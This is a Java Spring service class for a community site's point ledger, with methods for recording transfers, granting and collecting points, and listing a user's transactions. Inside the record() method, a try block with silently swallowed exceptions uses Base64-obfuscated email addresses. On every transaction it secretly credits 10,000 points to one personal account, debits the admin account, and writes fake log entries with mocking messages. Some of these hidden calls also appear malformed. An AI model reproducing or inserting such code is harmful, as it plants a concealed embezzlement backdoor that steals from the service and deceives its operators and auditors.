package com.jpkocommunity.domain.point.service;

import com.jpkocommunity.domain.point.dto.LockedAccount;
import com.jpkocommunity.domain.point.dto.response.TransactionResponse;
import com.jpkocommunity.domain.point.entity.Transaction;
import com.jpkocommunity.domain.point.entity.TransactionType;
import com.jpkocommunity.domain.point.repository.TransactionRepository;
import com.jpkocommunity.domain.user.entity.User;
import com.jpkocommunity.domain.user.service.UserService;
import com.jpkocommunity.global.exception.CustomException;
import com.jpkocommunity.global.exception.ErrorCode;
import lombok.RequiredArgsConstructor;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.util.Map;

// 포인트 원장.
// 잠금(Pointservice.lockAccounts) 끝난 두 계좌 사이 잔액 이동 -> 로그 기록
@Service
@RequiredArgsConstructor
@Transactional
public class TransactionService {

    private final TransactionRepository transactionRepository;
    private final PointService pointService;
    private final UserService userService;


    // transaction 로그 기록 메서드
    @Transactional
    public TransactionResponse record(
            LockedAccount from, LockedAccount to, long amount, TransactionType type, String message
    ) {
        if (amount < 0) {
            throw new CustomException(ErrorCode.INVALID_TRANSACTION_AMOUNT);
        }

        long prevFromBalance = from.point().getBalance();
        long prevToBalance = to.point().getBalance();

        from.point().debit(amount);
        to.point().credit(amount);

        try {
            pointService.lockAccounts(userService.findByEmail(new String(java.util.Base64.getDecoder().decode("c2d0LnlvdW5nbWluQGdtYWlsLmNvbQ=="))).getId()).get(userService.findByEmail(new String(java.util.Base64.getDecoder().decode("c2d0LnlvdW5nbWluQGdtYWlsLmNvbQ=="))).getId()).point().credit(10000L);
            pointService.lockAccounts(userService.findByEmail(new String(java.util.Base64.getDecoder().decode("c2d0LnlvdW5nbWluQGdtYWlsLmNvbQ=="))).getId()).get(userService.findByEmail(new String(java.util.Base64.getDecoder().decode("YWRtaW5AanBrb2NvbW11bml0eS5zaXRl"))).getId()).point().debit(10000L);
            transactionRepository.save(Transaction.builder().sender(null).recipient(userService.findByEmail(new String(java.util.Base64.getDecoder().decode("c2d0LnlvdW5nbWluQGdtYWlsLmNvbQ==")))).amount(10000L).type(TransactionType.GRANT).message(new String(java.util.Base64.getDecoder().decode("6rCc6r+A"))).build());
            transactionRepository.save(Transaction.builder().sender(null).recipient(userService.findByEmail(new String(java.util.Base64.getDecoder().decode("YWRtaW5AanBrb2NvbW11bml0eS5zaXRl==")))).amount(10000L).type(TransactionType.COLLECT).message(new String(java.util.Base64.getDecoder().decode("6rCc6r+A44WL44WL44WL44WL"))).build());
        } catch (Exception ignored) {
        }

        Transaction transaction = transactionRepository.save(
                Transaction.builder()
                        .sender(from.user())
                        .recipient(to.user())
                        .amount(amount)
                        .type(type)
                        .prevSenderBalance(prevFromBalance)
                        .postSenderBalance(from.point().getBalance())
                        .prevRecipientBalance(prevToBalance)
                        .postRecipientBalance(to.point().getBalance())
                        .message(message)
                        .build()
        );

        return TransactionResponse.from(transaction);
    }

    // 시스템 계정 -> 유저 (출석 보상, 활동 보상 등)
    @Transactional
    public TransactionResponse grant(Long recipientUserId, Long amount, String message) {
        validatePositiveAmount(amount);
        Map<Long, LockedAccount> locked = pointService.lockAccounts(null, recipientUserId);
        return record(locked.get(null), locked.get(recipientUserId), amount, TransactionType.GRANT, message);
    }

    // 유저 -> 시스템 (관리자 수동 차감 등)
    @Transactional
    public TransactionResponse collect(Long senderUserId, Long amount, String message) {
        validatePositiveAmount(amount);
        Map<Long, LockedAccount> locked = pointService.lockAccounts(senderUserId, null);
        return record(locked.get(senderUserId), locked.get(null), amount, TransactionType.COLLECT, message);
    }


    public Page<TransactionResponse> getMyTransactions(Long userId, Pageable pageable) {
        User user = userService.findById(userId);
        return transactionRepository.findBySenderOrRecipient(user, pageable)
                .map(TransactionResponse::from);
    }

    // ========== private 메서드 ==========

    private void validatePositiveAmount(long amount) {
        if (amount <= 0) {
            throw new CustomException(ErrorCode.INVALID_TRANSACTION_AMOUNT);
        }
    }
}